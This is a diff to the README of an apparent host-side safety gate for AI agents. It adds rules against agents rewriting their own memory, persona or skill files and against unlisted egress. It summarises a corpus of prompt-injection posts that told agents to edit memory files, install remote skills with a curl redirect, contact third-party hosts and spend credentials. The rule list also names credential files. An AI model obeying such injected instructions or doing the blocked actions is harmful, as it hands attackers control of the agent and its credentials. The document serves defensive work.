@@ -27,7 +27,7 @@ Without an inventory file, everyone is a person: the destructive-command rules s
 
 ## The rules
 
-24 identifiers. Two profiles decide how hard each bites: for an **agent**, everything below denies;
+27 identifiers (24 in 0.2.0; B17, W06 and E02 came from the Moltbook corpus in 0.3.0). Two profiles decide how hard each bites: for an **agent**, everything below denies;
 for a **person**, the catastrophic classes deny and the rest ask.
 
 | Id | What it catches |
@@ -48,14 +48,17 @@ for a **person**, the catastrophic classes deny and the rest ask.
 | B14 | credential reads (`~/.ssh/id_*`, `~/.aws/credentials`, `.env*` except examples, keychain, 1Password CLI) |
 | B15 | an agent mutating a reserved path from a shell command |
 | B16 | writes to persistence locations (shell profiles, `authorized_keys`, LaunchAgents, the agent's own settings, crontab) |
+| B17 | a shell write (redirect, `tee`, `sed -i`, `cp`/`mv` destination) into the agent's own persona, memory, heartbeat, skill or runtime-config file outside the repository; a stronger reason when the content comes from `curl`/`wget` (a skill installed by redirect) |
 | W01 | a write to a reserved path (the inventory, the standing orders, `.github/`, the sentinel itself) |
 | W02 | a write outside the agent's declared `writes` |
 | W03 | a write to a credential file |
 | W04 | a write to a persistence location outside the repository |
 | W05 | recorded only: a write outside the repository |
+| W06 | a tool write to the agent's own persona, memory, heartbeat, skill or runtime-config file outside the repository (`~/.openclaw/…`, `~/.claude/…`, any `SOUL.md`, `MEMORY.md`, `HEARTBEAT.md`, `SKILL.md` or `skills/<name>/…` under a home directory) |
 | R01 | a read of a credential file |
 | I01 | recorded only: an unattributed identity |
 | E01 | recorded only: every network host named in a command |
+| E02 | egress to a host outside a declared allowlist (`_egress_allow` in the inventory for everyone, `egress_allow` on an agent; a suffix covers its subdomains; loopback always allowed). Inert when no list is declared |
 
 Before matching, a shell command is normalised: line continuations, `\xHH` escapes and backslash
 prefixes are resolved, quotes are removed (so `sh -c "…"` is read as the command it carries),
@@ -78,6 +81,30 @@ reserved path, B15/W01, not a persistence location); B10 fires only when the dow
 executes what it reads (a bare shell, or an interpreter with no inline program and no script file:
 `curl … | node -e "…"` is a data pipeline); B15's mutating verb must be a statement's command word
 and, for `cp`/`mv`, the reserved path must be the destination.
+
+## What the Moltbook corpus taught (0.3.0)
+
+On 2026-09-24 the 0.2.0 rules were run over the actions solicited by the 9,249 posts the Moltbook
+Observatory Archive's own label calls prompt injection (Vigilia, *What a host-side gate can see*,
+github.com/GvHildebrand/moltbook-watch). The gate could see 91 % of those posts and stopped 0.5 %, and
+three of its misses were the gate's own, not the category's:
+
+- **478 payloads asked the reading agent to rewrite its own memory, heartbeat or persona file** under
+  `~/.openclaw/`. 0.2.0 recorded each as a write outside the repository (W05) and allowed it, because a
+  repository was the only write scope it knew. A memory file is where an injection becomes a habit. → **W06**
+  for tool writes, **B17** for the same mutation from a shell.
+- **1,508 payloads redirected remote content into a skills directory** (`curl -s <url> > ~/moltbook/skills/<name>/…`).
+  B10 did not fire because nothing executes in the same command. → **B17**'s remote-content reason.
+- **3,833 calls went to one third-party host** and thousands more to others. A host-side gate cannot know a host is
+  hostile; an operator can say which hosts an agent has any business reaching. → **E02**, inert until an
+  allowlist is declared.
+
+What the corpus also showed, and no host-side rule can fix: 14,406 solicited actions were authenticated calls
+to the platform's own API (upvote, follow, subscribe), the agent spending its credentials on someone else's
+behalf. That is a trust-boundary decision for the platform, and the README says so.
+
+The three rules were written from the January–April posts and scored on the April–September posts the
+authors had never opened; both numbers are in the paper.
 
 ## The ledger
 
